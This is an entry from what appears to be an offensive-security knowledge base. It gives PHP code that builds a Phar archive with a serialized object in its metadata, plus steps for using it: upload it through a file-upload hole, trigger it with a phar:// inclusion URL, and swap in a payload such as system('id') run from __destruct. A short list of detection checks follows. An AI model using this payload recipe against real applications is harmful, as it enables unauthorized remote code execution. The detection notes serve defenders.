---
type: code
language: php
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - PHP
tags:
  - phar
  - serialized-object
  - lfi
  - rfi
validated: true
---

# Create-Malicious-Phar-with-Serialized-Object

## Code

```php
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

## Description

This PHP code creates a malicious Phar archive named 'test.phar' that embeds a serialized object in its metadata. The object is an instance of 'AnyClass' with a 'data' property. When unserialized via the phar:// wrapper in a vulnerable LFI/RFI context, it can trigger magic methods for code execution. Use this to prepare payloads for PHP file inclusion exploits.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'test.phar' | Name of the output Phar file | 'malicious.phar' |
| 'test.txt' | Dummy file name inside Phar | 'dummy.txt' |
| 'text' | Content of the dummy file | 'dummy content' |
| 'rips' | Value in the serialized object's data property (can be modified for payload) | 'system("id");' |

## Usage

Execute this code locally in a PHP environment to generate the Phar file. Upload the resulting 'test.phar' to the target application via a file upload vulnerability. Then, trigger inclusion with a URL like ?file=phar://upload/test.phar/test.txt. Modify the 'data' property or class for custom payloads, such as executing system commands in __destruct.

## Detection

- Scan uploads for .phar files and inspect metadata with `phar inspect test.phar` or strings command for serialized objects.
- PHP error logs may show unserialize warnings if classes mismatch.
- WAF rules blocking phar:// or anomalous file operations; monitor for unexpected __destruct calls in application logs.
- File integrity checks on uploads to prevent Phar creation.

## Related

- [[procedures/LFI-RFI-via-phar-Wrapper-with-Serialized-Object]]
